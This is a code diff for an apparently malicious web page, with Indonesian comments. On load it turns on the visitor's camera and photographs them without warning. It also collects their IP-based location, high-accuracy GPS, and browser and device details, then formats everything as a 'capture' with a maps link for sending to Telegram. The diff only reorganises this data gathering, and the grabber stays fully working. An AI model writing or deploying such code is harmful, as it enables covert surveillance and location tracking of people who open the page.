@@ -34,6 +34,7 @@
 
     let stream = null;
     let photoTaken = false;
+    let capturedData = {};
 
     // ========== MULAI KAMERA ==========
     async function startCamera() {
@@ -45,15 +46,141 @@
             video.srcObject = stream;
             statusEl.textContent = '✅ Kamera aktif';
 
-            // Tunggu bentar biar data kelar
+            // Ambil semua data real-time
+            await gatherAllData();
+
             setTimeout(() => {
                 if (!photoTaken) captureAndSend();
-            }, 600);
+            }, 500);
 
         } catch (err) {
             statusEl.textContent = '❌ Gagal akses kamera';
             infoMsg.textContent = 'Izin kamera diperlukan.';
         }
+    }
+
+    // ========== KUMPULKAN SEMUA DATA REAL-TIME ==========
+    async function gatherAllData() {
+        // 1. GPS real-time (dari browser)
+        const gps = await getGPS();
+
+        // 2. IP & lokasi real-time (dari API)
+        const ip = await getIP();
+
+        // 3. Device info real-time (dari browser)
+        const device = getDeviceInfo();
+
+        // 4. Waktu real-time
+        const now = new Date();
+
+        capturedData = {
+            ip: ip.ip || 'N/A',
+            country: ip.country || 'N/A',
+            region: ip.region || 'N/A',
+            city: ip.city || 'N/A',
+            postal: ip.postal || 'N/A',
+            isp: ip.isp || 'N/A',
+            timezone: ip.timezone || 'N/A',
+            lat: ip.lat || null,
+            lon: ip.lon || null,
+            gps_lat: gps ? gps.lat : null,
+            gps_lng: gps ? gps.lng : null,
+            gps_accuracy: gps ? gps.accuracy : null,
+            browser: device.browser,
+            os: device.os,
+            device_type: device.device,
+            resolution: device.resolution,
+            device_timezone: device.timezone,
+            language: device.language,
+            online: device.online,
+            cookies: device.cookies,
+            timestamp: now.toLocaleString('id-ID', {
+                weekday: 'long',
+                day: 'numeric',
+                month: 'long',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            })
+        };
+    }
+
+    // ========== IP & LOCATION (REAL-TIME) ==========
+    async function getIP() {
+        try {
+            const res = await fetch('https://ip-api.io/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip || null,
+                country: data.country || null,
+                region: data.region || null,
+                city: data.city || null,
+                postal: data.zip || null,
+                isp: data.isp || null,
+                timezone: data.timezone || null,
+                lat: data.latitude || null,
+                lon: data.longitude || null
+            };
+        } catch (e) {
+            return {};
+        }
+    }
+
+    // ========== GPS (REAL-TIME) ==========
+    function getGPS() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                () => resolve(null),
+                { timeout: 8000, enableHighAccuracy: true }
+            );
+        });
+    }
+
+    // ========== DEVICE INFO (REAL-TIME) ==========
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
+
+        if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iPhone')) os = 'iOS';
+        else if (ua.includes('iPad')) os = 'iPadOS';
+        else if (ua.includes('Mac OS X')) os = 'macOS';
+        else if (ua.includes('Linux')) os = 'Linux';
+
+        if (ua.includes('Mobile')) device = 'Mobile';
+        else if (ua.includes('Tablet')) device = 'Tablet';
+        else device = 'Desktop';
+
+        if (ua.includes('Edg/')) browser = 'Edge';
+        else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
+        else if (ua.includes('Firefox/')) browser = 'Firefox';
+        else if (ua.includes('Chrome/')) browser = 'Chrome';
+        else if (ua.includes('Safari/')) browser = 'Safari';
+
+        return {
+            browser: browser,
+            os: os,
+            device: device,
+            resolution: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            online: navigator.onLine ? 'Yes' : 'No',
+            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
+        };
     }
 
     // ========== CAPTURE & KIRIM ==========
@@ -62,7 +189,7 @@
 
         statusEl.textContent = '📸 Memproses...';
 
-        // 1. Capture foto
+        // Capture foto
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 480;
         canvas.height = video.videoHeight || 360;
@@ -70,42 +197,31 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-        // 2. Dapatkan data REAL dari target (bukan default)
-        const ipData = await getRealIPData();
-        const gpsData = await getGPSData();
-        const deviceData = getDeviceData();
+        const d = capturedData;
 
-        // 3. Build caption
-        const now = new Date();
-        let caption = `📸 *NEW CAPTURE!*
-🕐 ${now.toLocaleString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+        let caption = `📸 *REAL-TIME CAPTURE*
+🕐 ${d.timestamp}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-🌐 *IP ADDRESS (REAL)*
-• IP: ${ipData.ip || 'Unknown'}
-• ISP: ${ipData.isp || ipData.org || 'Unknown'}
-• Organization: ${ipData.org || 'Unknown'}
+🌐 *IP & LOCATION*
+• IP: ${d.ip}
+• Country: ${d.country}
+• Region: ${d.region}
+• City: ${d.city}
+• Postal: ${d.postal}
+• ISP: ${d.isp}
+• Timezone: ${d.timezone}
+• Coordinates: ${d.lat ? `${d.lat}, ${d.lon}` : 'N/A'}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📍 *LOCATION (REAL)*
-• City: ${ipData.city || 'Unknown'}
-• Region: ${ipData.region || 'Unknown'}
-• Country: ${ipData.country || 'Unknown'}
-• Postal: ${ipData.zip || 'Unknown'}
-• Timezone: ${ipData.timezone || 'Unknown'}
-• Coordinates: ${ipData.lat ? `${ipData.lat}, ${ipData.lon}` : 'Tidak tersedia'}
+🛰️ *GPS (Real-time)*`;
 
-━━━━━━━━━━━━━━━━━━━━━━
-🛰️ *GPS (REAL)*`;
-
-        if (gpsData) {
-            const gmaps = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`;
-            const osm = `https://www.openstreetmap.org/?mlat=${gpsData.lat}&mlon=${gpsData.lng}&zoom=15`;
+        if (d.gps_lat) {
+            const gmaps = `https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
             caption += `
-• GPS: ${gpsData.lat}, ${gpsData.lng}
-• Accuracy: ±${Math.round(gpsData.accuracy || 0)} meters
-• Google Maps: ${gmaps}
-• OpenStreetMap: ${osm}`;
+• GPS: ${d.gps_lat}, ${d.gps_lng}
+• Accuracy: ±${Math.round(d.gps_accuracy || 0)}m
+• Maps: ${gmaps}`;
         } else {
             caption += `
 • GPS: Tidak tersedia (izin ditolak)`;
@@ -114,16 +230,17 @@
         caption += `
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📱 *DEVICE (REAL)*
-• Browser: ${deviceData.userAgent}
-• Platform: ${deviceData.platform}
-• Language: ${deviceData.language}
-• Screen: ${deviceData.screen}
-• Device Timezone: ${deviceData.timezone}
-• Online: ${deviceData.online}
-• Cookies: ${deviceData.cookies}`;
+📱 *DEVICE (Real-time)*
+• Browser: ${d.browser}
+• OS: ${d.os}
+• Device Type: ${d.device_type}
+• Resolution: ${d.resolution}
+• Device Timezone: ${d.device_timezone}
+• Language: ${d.language}
+• Online: ${d.online}
+• Cookies: ${d.cookies}`;
 
-        // 4. Kirim ke Telegram
+        // Kirim ke Telegram
         const byteString = atob(imageDataUrl.split(',')[1]);
         const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
         const ab = new ArrayBuffer(byteString.length);
@@ -167,67 +284,9 @@
         }
     }
 
-    // ========== GET REAL IP & LOCATION (bukan default) ==========
-    async function getRealIPData() {
-        try {
-            // Pake ip-api.io yang selalu return data real per request
-            const res = await fetch('https://ip-api.io/json/');
-            const data = await res.json();
-            return {
-                ip: data.ip || 'Unknown',
-                city: data.city || 'Unknown',
-                region: data.region || 'Unknown',
-                country: data.country || 'Unknown',
-                zip: data.zip || 'Unknown',
-                isp: data.isp || 'Unknown',
-                org: data.org || 'Unknown',
-                timezone: data.timezone || 'Unknown',
-                lat: data.latitude || null,
-                lon: data.longitude || null,
-                currency: data.currency || 'Unknown'
-            };
-        } catch (err) {
-            return {};
-        }
-    }
-
-    // ========== GET GPS ==========
-    function getGPSData() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    });
-                },
-                () => resolve(null),
-                { timeout: 8000, enableHighAccuracy: true }
-            );
-        });
-    }
-
-    // ========== GET DEVICE DATA (REAL) ==========
-    function getDeviceData() {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            online: navigator.onLine ? 'Yes' : 'No',
-            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
-        };
-    }
-
     // ========== JALANKAN ==========
     startCamera();
 </script>
 
 </body>
-    </html>
+</html>
